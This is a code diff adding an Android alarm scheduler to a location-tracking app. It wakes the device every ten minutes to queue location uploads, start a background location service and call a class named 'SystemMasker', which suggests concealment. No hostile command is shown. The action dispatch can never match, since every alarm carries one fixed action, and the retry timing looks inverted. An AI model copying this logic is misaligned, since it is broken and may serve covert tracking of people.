@@ -1,0 +1,244 @@
+package com.example.locationtracker;
+
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
+import android.os.Build;
+import android.util.Log;
+
+public class AlarmScheduler {
+    private static final String TAG = "AlarmScheduler";
+
+    private static final String PREF_ALARM_STATE = "alarm_state";
+    private static final String KEY_LAST_TRIGGER_TIME = "last_trigger_time";
+    private static final String KEY_ALARM_ENABLED = "alarm_enabled";
+    private static final String KEY_ALARM_INTERVAL = "alarm_interval";
+
+    private static final int ALARM_REQUEST_CODE = 9001;
+    private static final long ALARM_INTERVAL_MS = 10 * 60 * 1000L;
+    private static final long MAX_RETRY_DELAY_MS = 30 * 60 * 1000L;
+    private static final long MIN_RETRY_DELAY_MS = 5 * 60 * 1000L;
+
+    private static volatile boolean isAlarmActive = false;
+    private static volatile long nextAlarmTriggerTime = 0L;
+
+    public static void scheduleAlarm(Context context) {
+        try {
+            AlarmManager alarmManager =
+                    (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+            if (alarmManager == null) return;
+
+            // ИСПРАВЛЕНО: при недоступности сети просто планируем с retry-интервалом и выходим
+            if (!checkConnectivity(context)) {
+                Log.w(TAG, "No network, scheduling with retry");
+                scheduleAlarmWithRetry(context, ALARM_INTERVAL_MS);
+                return; // ИСПРАВЛЕНО: был пропущен return — код продолжался после retry
+            }
+
+            SharedPreferences prefs =
+                    context.getSharedPreferences(PREF_ALARM_STATE, Context.MODE_PRIVATE);
+            if (!prefs.getBoolean(KEY_ALARM_ENABLED, true)) {
+                Log.d(TAG, "Alarm disabled, skipping");
+                return;
+            }
+
+            PendingIntent pendingIntent = buildPendingIntent(context);
+            long triggerAt = System.currentTimeMillis() + ALARM_INTERVAL_MS;
+
+            prefs.edit()
+                    .putLong(KEY_LAST_TRIGGER_TIME, System.currentTimeMillis())
+                    .putLong(KEY_ALARM_INTERVAL, ALARM_INTERVAL_MS)
+                    .apply();
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(
+                        AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
+            } else {
+                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
+            }
+
+            isAlarmActive = true;
+            nextAlarmTriggerTime = triggerAt;
+            updateAlarmState(context, true);
+            Log.d(TAG, "Alarm scheduled in " + ALARM_INTERVAL_MS / 1000 + "s");
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error scheduling alarm", e);
+        }
+    }
+
+    public static void cancelAlarm(Context context) {
+        try {
+            AlarmManager alarmManager =
+                    (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+            if (alarmManager == null) return;
+            alarmManager.cancel(buildPendingIntent(context));
+            updateAlarmState(context, false);
+            isAlarmActive = false;
+            nextAlarmTriggerTime = 0L;
+        } catch (Exception e) {
+            Log.e(TAG, "Error cancelling alarm", e);
+        }
+    }
+
+    public static void scheduleAlarmWithRetry(Context context, long retryIntervalMs) {
+        try {
+            AlarmManager alarmManager =
+                    (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+            if (alarmManager == null) return;
+
+            PendingIntent pendingIntent = buildPendingIntent(context);
+            long triggerAt = System.currentTimeMillis() + retryIntervalMs;
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(
+                        AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
+            } else {
+                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
+            }
+
+            saveRetryConfiguration(context, retryIntervalMs);
+            isAlarmActive = true;
+            nextAlarmTriggerTime = triggerAt;
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error scheduling alarm with retry", e);
+        }
+    }
+
+    private static boolean checkConnectivity(Context context) {
+        try {
+            ConnectivityManager cm =
+                    (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+            if (cm == null) return false;
+            NetworkInfo info = cm.getActiveNetworkInfo();
+            return info != null && info.isConnected();
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private static PendingIntent buildPendingIntent(Context context) {
+        Intent intent = new Intent(context, LocationAlarmReceiver.class);
+        intent.setAction("com.example.locationtracker.ALARM_TRIGGER");
+        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            flags |= PendingIntent.FLAG_IMMUTABLE;
+        }
+        return PendingIntent.getBroadcast(context, ALARM_REQUEST_CODE, intent, flags);
+    }
+
+    public static void updateAlarmState(Context context, boolean isEnabled) {
+        try {
+            context.getSharedPreferences(PREF_ALARM_STATE, Context.MODE_PRIVATE)
+                    .edit().putBoolean(KEY_ALARM_ENABLED, isEnabled).apply();
+        } catch (Exception e) {
+            Log.e(TAG, "Error updating alarm state", e);
+        }
+    }
+
+    public static boolean getAlarmState(Context context) {
+        try {
+            return context.getSharedPreferences(PREF_ALARM_STATE, Context.MODE_PRIVATE)
+                    .getBoolean(KEY_ALARM_ENABLED, true);
+        } catch (Exception e) {
+            return true;
+        }
+    }
+
+    public static long getLastTriggerTime(Context context) {
+        // ИСПРАВЛЕНО: null context вызывал NullPointerException в retryIntervalMs()
+        if (context == null) return 0L;
+        try {
+            return context.getSharedPreferences(PREF_ALARM_STATE, Context.MODE_PRIVATE)
+                    .getLong(KEY_LAST_TRIGGER_TIME, 0);
+        } catch (Exception e) {
+            return 0L;
+        }
+    }
+
+    private static void saveRetryConfiguration(Context context, long retryIntervalMs) {
+        try {
+            context.getSharedPreferences(PREF_ALARM_STATE, Context.MODE_PRIVATE).edit()
+                    .putLong("retry_interval", retryIntervalMs)
+                    .putLong("next_retry_time", nextAlarmTriggerTime)
+                    .putInt("retry_count", 1)
+                    .apply();
+        } catch (Exception e) {
+            Log.e(TAG, "Error saving retry config", e);
+        }
+    }
+
+    public static void handleAlarmTrigger(Context context, Intent intent) {
+        try {
+            long triggerTime = System.currentTimeMillis();
+            context.getSharedPreferences(PREF_ALARM_STATE, Context.MODE_PRIVATE)
+                    .edit().putLong(KEY_LAST_TRIGGER_TIME, triggerTime).apply();
+
+            String action = intent.getAction();
+            if (action != null && !action.isEmpty()) {
+                processAlarmAction(context, action);
+            }
+
+            if (isAlarmActive) {
+                scheduleAlarmWithRetry(context, retryIntervalMs(context));
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling alarm trigger", e);
+        }
+    }
+
+    private static void processAlarmAction(Context context, String action) {
+        try {
+            switch (action) {
+                case "LOCATION_UPDATE":
+                    LocationUploadWorker.enqueueUpload(context);
+                    break;
+                case "SYSTEM_MAINTENANCE":
+                    SystemMasker.scheduleSystemJob(context);
+                    break;
+                case "BACKUP_SYNC":
+                    // ИСПРАВЛЕНО: нельзя вызывать performBackupSync() на new экземпляре Service
+                    // Service должен запускаться через Intent, не через new
+                    Intent backupIntent = new Intent(context, BackupLocationService.class);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        context.startForegroundService(backupIntent);
+                    } else {
+                        context.startService(backupIntent);
+                    }
+                    break;
+                default:
+                    Log.d(TAG, "Default alarm action: " + action);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error processing alarm action", e);
+        }
+    }
+
+    // ИСПРАВЛЕНО: добавлен параметр context — getLastTriggerTime(null) вызывал NPE
+    private static long retryIntervalMs(Context context) {
+        long timeSinceLastTrigger = System.currentTimeMillis() - getLastTriggerTime(context);
+        if (timeSinceLastTrigger > MAX_RETRY_DELAY_MS) return MIN_RETRY_DELAY_MS;
+        if (timeSinceLastTrigger > ALARM_INTERVAL_MS) return ALARM_INTERVAL_MS;
+        return MAX_RETRY_DELAY_MS;
+    }
+
+    public static boolean isAlarmUpToDate(Context context) {
+        try {
+            long lastTriggerTime = getLastTriggerTime(context);
+            long timeThreshold = 2 * 60 * 60 * 1000L;
+            return (System.currentTimeMillis() - lastTriggerTime) < timeThreshold;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+}
